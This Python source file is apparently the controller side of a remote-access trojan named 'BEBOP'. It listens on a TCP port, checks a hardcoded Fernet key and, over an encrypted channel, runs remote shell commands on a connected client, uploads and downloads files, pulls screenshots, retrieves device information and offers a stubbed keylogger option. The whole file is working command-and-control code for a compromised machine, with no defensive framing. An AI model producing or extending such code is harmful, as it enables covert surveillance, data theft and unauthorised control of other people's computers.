import socket
import sys
import time
import os
from cryptography.fernet import Fernet

address = ("0.0.0.0", 3001)
f_key = b'FhnnERujmRY65fVqM0S_LvK26NybEETUlK0_gvV9Dws=' # Insert key from Fernet.generate_key(), must be same as client
script_cwd = os.getcwd()
device_info = ""

def print_menu():
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Keylogger")
    print("4.) Get Device Info")
    print("5.) Exit\n\n")

def get_info():
    device_info = recv()
    print(f"\n\n{device_info.decode()}\n\n")

def recv(buff_size=1024):
    data_buff = bytes()
    data_size = conn_to_client.recv(12)
    data_size = int(data_size.decode().rstrip())

    if not data_size:
        return None

    while len(data_buff) < data_size:
        data_buff += conn_to_client.recv(buff_size)

    return lock.decrypt(data_buff)

def send(data):
    header_size = 12
    encrypted_data = lock.encrypt(data)
    data_size = f"{len(encrypted_data):<{header_size}}"
    conn_to_client.sendall(data_size.encode()+encrypted_data)


def upload_file(file_name):
    try:
        with open(f"{file_name}", "rb") as file:
            file_data = file.read()
            send(file_data)


    except OSError as e:
        print(e)
        send(b'')

def download_file(file_name):
    file_data = recv(buff_size=16384)
    if not file_data:
        print("Could not download file...")
        return

    try:
        file = open(f"{file_name}", "wb")
        file.write(file_data)
        file.close()

    except OSError as e:
        print(e)


def open_shell():
    # shell_history_forward = []
    # shell_history_backward = []
    # def on_press(key):
    #     lst_cmd = ""
    #     if key == "Key.up":
    #         if len(shell_history_forward) > 0:
    #                 lst_cmd = shell_history_forward.pop()
    #                 shell_history_backward.append(lst_cmd)
    #     elif key == "Key.down":
    #         if len(shell_history_backward) > 0:
    #             lst_cmd = shell_history_backward.pop()
    #             shell_history_forward.append(lst_cmd)
                            
    #     print(shell_history_forward)        
    #     print(shell_history_backward)
    # l = Listener(on_press=on_press)
    # l.start()


    while True:
        cmd = input("\nbebop#: ")

        if cmd:
            if cmd == "exit":
                send(cmd.encode())
                break

            elif cmd[:2] == "dw":
                #Download
                print("Downloading...")
                send(cmd.encode())

                file_name = cmd[3:]
                download_file(file_name)

            elif cmd[:2] == "up":
                #Upload
                print("Uploading...")
                send(cmd.encode())
                file_name = cmd[3:]
                file_name = file_name.replace(' ', '\ ')
                upload_file(file_name)

            else:
                send(cmd.encode())
                output = recv()

                try:
                    output = output.decode() 

                except UnicodeDecodeError:
                    print("Already in bytes")
                    
                finally:
                    print(output)
                

            #shell_history_forward.append(cmd)

    #l.stop()

def establish_connection(address):
    global conn_to_client, lock
    lock = Fernet(f_key)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(address)
    server.listen(0)

    print("[+] Waiting on connections")
    while True: 
        conn_to_client, client_addr = server.accept()
        if conn_to_client:
            client_key = recv().decode()
            if client_key != f_key.decode():
                kill_connection()
                print("[+] Unable to authenticate. Closing connection...")
            else:
                send(b'OK')
                print(f"[+] Encrypted Connection to {client_addr[0]}:{client_addr[1]} Established!")
                break
        else:
            sys.exit("[+] Failed to recieve connection to client...Exiting")

def kill_connection():
    conn_to_client.shutdown(socket.SHUT_WR)
    conn_to_client.close()

def main():
    establish_connection(address)
    
    while conn_to_client:
        try:
            print_menu()
            choice = input("Enter Choice: ")
            send(choice.encode())

            if choice == "1":
                open_shell()

            elif choice == "2":
                print("\nTaking Screenshot...")
                download_file(file_name=f"{time.asctime()}.png")
                print(f"\nScreenshot saved in {script_cwd}/{time.asctime()}.png")

            elif choice == "3":
                pass

            elif choice == "4":
                get_info()

            elif choice == "5":
                keep_alive = input("[+] Keep client alive? (Y or N): ")
                print("[+] Keeping client alive..." if keep_alive.lower() == "y" or keep_alive == "yes" else "[+] Killing client connection...")
                send(keep_alive.encode())
                break

        except BrokenPipeError as bp:
            print("Connection lost...")
            print(bp)
            break
            
        
    kill_connection()


main()
